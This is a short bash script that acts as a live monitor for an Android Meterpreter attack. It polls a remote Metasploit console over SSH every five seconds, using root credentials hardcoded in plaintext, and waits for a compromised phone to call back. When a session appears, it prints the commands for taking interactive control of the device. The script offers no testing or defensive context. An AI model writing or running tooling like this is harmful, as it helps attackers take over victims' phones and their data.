#!/bin/bash

# Real-time Session Monitor
echo "╔════════════════════════════════════════╗"
echo "║    🔴 LIVE Session Monitor             ║"
echo "╚════════════════════════════════════════╝"
echo ""
echo "⏰ Checking every 5 seconds..."
echo "🎯 Now launch the app on mobile!"
echo "📱 Press Ctrl+C to stop"
echo ""

while true; do
    TIMESTAMP=$(date '+%H:%M:%S')
    echo -n "[$TIMESTAMP] "
    
    SESSION=$(sshpass -p 8181 ssh -o StrictHostKeyChecking=no -p 55001 root@crossover.proxy.rlwy.net \
        "msfconsole -q -x 'sessions -l; exit' 2>/dev/null" | grep -E "android|meterpreter|sessions" | grep -v "No active")
    
    if [ -n "$SESSION" ]; then
        echo "🎉 SESSION FOUND!"
        echo "$SESSION"
        echo ""
        echo "╔════════════════════════════════════════╗"
        echo "║  ✅ SUCCESS! Session Established!     ║"
        echo "╚════════════════════════════════════════╝"
        echo ""
        echo "Connect now:"
        echo "  ssh -p 55001 root@crossover.proxy.rlwy.net"
        echo "  Password: 8181"
        echo ""
        echo "Then:"
        echo "  msfconsole -q"
        echo "  sessions -i 1"
        break
    else
        echo "⏳ Waiting for connection..."
    fi
    
    sleep 5
done
